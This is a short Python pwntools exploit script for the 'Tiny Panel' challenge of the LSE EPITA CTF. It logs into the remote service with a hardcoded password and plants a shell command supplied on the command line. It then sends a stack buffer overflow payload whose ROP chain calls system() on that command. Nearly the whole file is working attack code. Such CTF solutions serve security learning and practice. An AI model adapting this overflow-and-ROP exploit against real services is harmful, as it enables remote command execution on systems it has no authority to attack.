#!/usr/bin/python

#Author : Abdeljalil Nouiri
#exploit For LSE EPITA CTF : Tiny Panel 50 pts

from pwn import *
import sys

username = "admin"
password = "T6OBSh2i"
CMD = 0x601100
system = 0x0000000000400630
poprdi = 0x0000000000400b03
"""
readGOT = 0x0000000000601038
puts = 0x0000000000400620

"""

#con = process("./pwn50")
con = remote(sys.argv[1],int(sys.argv[2])) 
#python pwn50.py ctf.lse.epita.fr 52190 "cat flag.txt"


#### LOGIN
con.recvuntil("username:")
con.sendline(username)

con.recvuntil("password:")
con.sendline(password)


#### SEND COMMAND 
con.recvuntil("choice:")
con.sendline("1")
con.recvuntil("Command:")
con.sendline(sys.argv[3])

#### Control RIP

payload = "3"
payload += "A"*87
payload += p64(poprdi)
payload += p64(CMD)
payload += p64(system)

con.recvuntil("choice:")
con.sendline(payload)
con.recv(4094)
print con.recv(4094)
